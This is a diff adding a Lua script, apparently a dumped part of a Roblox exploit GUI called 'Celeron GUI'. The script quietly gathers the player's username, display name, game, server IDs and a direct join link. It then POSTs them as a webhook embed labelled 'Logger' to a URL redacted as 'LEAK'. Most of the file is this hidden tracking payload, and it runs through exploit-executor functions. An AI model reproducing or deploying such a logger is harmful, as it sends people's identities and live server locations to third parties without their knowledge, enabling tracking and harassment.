@@ -1,0 +1,74 @@
+-- ts file was generated at discord.gg/25ms
+
+local fenv = getfenv()
+local _call3 = game:GetService('HttpService')
+local _call5 = game:GetService('Players')
+local _call7 = game:GetService('MarketplaceService')
+local _LocalPlayer8 = _call5.LocalPlayer
+local _call10 = game:GetService('CoreGui')
+local _gamePlaceId11 = game.PlaceId
+local _gameJobId12 = game.JobId
+
+_call10:FindFirstChild('ExperienceChat'):FindFirstChild('appLayout'):FindFirstChild('enableChatButton'):FindFirstChild('EnableChatButton')
+
+local _ = fenv.syn
+local _call42 = _call3:JSONEncode({
+    username = 'execution chamber',
+    embeds = {
+        [1] = {
+            color = 65280,
+            fields = {
+                [1] = {
+                    value = _call7:GetProductInfo(_gamePlaceId11).Name,
+                    name = 'Game Name',
+                    inline = false,
+                },
+                [2] = {
+                    value = _LocalPlayer8.DisplayName,
+                    name = 'Display Name',
+                    inline = false,
+                },
+                [3] = {
+                    value = _LocalPlayer8.Name,
+                    name = 'Username',
+                    inline = false,
+                },
+                [4] = {
+                    value = #_call5:GetPlayers() .. '/' .. _call5.MaxPlayers,
+                    name = 'Players',
+                    inline = false,
+                },
+                [5] = {
+                    value = 'PlaceId: ' .. _gamePlaceId11 .. '\nJobId: ' .. _gameJobId12,
+                    name = 'Server Info',
+                    inline = false,
+                },
+                [6] = {
+                    value = 'false',
+                    name = 'Can Use Commands On:',
+                    inline = false,
+                },
+                [7] = {
+                    value = '[Join Server](' .. 'https://www.roblox.com/games/start?placeId=' .. _gamePlaceId11 .. '&gameInstanceId=' .. _gameJobId12 .. ')',
+                    name = 'Join Server?',
+                    inline = false,
+                },
+                [8] = {
+                    value = '04/01/2026 08:54 AM',
+                    name = 'Script Executed On:',
+                    inline = false,
+                },
+            },
+            title = 'Celeron GUI: Logger',
+        },
+    },
+})
+
+http_request({
+    Body = _call42,
+    Url = 'LEAK',
+    Method = 'POST',
+    Headers = {
+        ['Content-Type'] = 'application/json',
+    },
+})
